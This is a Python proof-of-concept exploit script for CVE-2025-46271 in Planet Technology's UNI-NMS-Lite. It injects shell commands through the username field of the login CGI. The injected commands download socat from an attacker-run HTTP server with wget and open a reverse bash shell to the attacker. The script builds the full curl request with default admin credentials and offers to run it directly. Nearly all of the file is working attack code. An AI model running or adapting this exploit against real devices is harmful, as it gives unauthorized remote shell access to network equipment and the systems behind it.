import shlex
import urllib.parse
import os

"""
CVE-2025-46271 Reverse Shell Exploit PoC
Tested on:
Product: UNI-NMS-Lite
Vendor: Planet Technology
Firmware Version: 1.0b210426
"""

def get_non_empty_input(prompt):
    while True:
        value = input(prompt).strip()
        if value:
            return value
        print("Error: This field cannot be blank.\n")

def get_yes_no_input(prompt):
    while True:
        response = input(prompt).strip().lower()
        if response in ('y', 'n'):
            return response == 'y'
        print("Error: Please enter 'y' or 'n'.\n")
		
def main():
    # Initial setup
    print("\n[1/2] Start socat listener:")
    print("socat file:`tty`,raw,echo=0 tcp-listen:5555")
    input("Press Enter to continue...")
    
    print("\n[2/2] Start python server in directory with socat:")
    print("python3 -m http.server 80")
    input("Press Enter to continue...\n")

    # Inputs
    target_ip = get_non_empty_input("What is the Target IP?: ")
    target_port = input("What is the Target Port? [default 8888]: ").strip() or "8888"
    listener_port = get_non_empty_input("What Port is socat listening on?: ")
    attacker_ip = get_non_empty_input("What IP is your socat hosted on?: ")
    attacker_port = input("What Port is your socat hosted on? [default 80]: ").strip() or "80"

    # Base URL
    base_url = f"{attacker_ip}" if attacker_port == "80" else f"{attacker_ip}:{attacker_port}"

    # Create payload
    payload_str = (
        f'{{"username":"admin; wget -q {base_url}/socat -O /tmp/socat; '
        f'chmod +x /tmp/socat; /tmp/socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{attacker_ip}:{listener_port} #",'
        f'"password":"admin"}}'
    )

    # URL-encode
    encoded_param = urllib.parse.quote(payload_str, safe="")

    # Build curl command
    cmd = f"""curl --path-as-is -i -s -k -X $'POST' \\
    -H $'Host: {target_ip}:{target_port}' \\
    -H $'Content-Length: 290' \\
    -H $'Sec-Ch-Ua-Platform: \\"Linux\\"' \\
    -H $'Authorization: Basic YWRtaW46YWRtaW4=' \\
    -H $'Accept-Language: en-US,en;q=0.9' \\
    -H $'Sec-Ch-Ua: \\"Chromium\\";v=\\"133\\", \\"Not(A:Brand\\";v=\\"99\\"' \\
    -H $'Sec-Ch-Ua-Mobile: ?0' \\
    -H $'X-Requested-With: XMLHttpRequest' \\
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' \\
    -H $'Accept: */*' \\
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\
    -H $'Origin: https://{target_ip}:{target_port}' \\
    -H $'Sec-Fetch-Site: same-origin' \\
    -H $'Sec-Fetch-Mode: cors' \\
    -H $'Sec-Fetch-Dest: empty' \\
    -H $'Referer: https://{target_ip}:{target_port}/' \\
    -H $'Accept-Encoding: gzip, deflate, br' \\
    -H $'Priority: u=1, i' \\
    -H $'Connection: keep-alive' \\
    -b $'seed=355145' \\
    --data-binary $'parameter={encoded_param}' \\
    $'https://{target_ip}:{target_port}/cgi-bin/login.py'"""

    print("\n[+] Generated curl command:\n")
    print(cmd)
    
    if get_yes_no_input("\nExecute command? (y/n): "):
        os.system(f"/bin/bash -c {shlex.quote(cmd)}")

if __name__ == "__main__":
    main()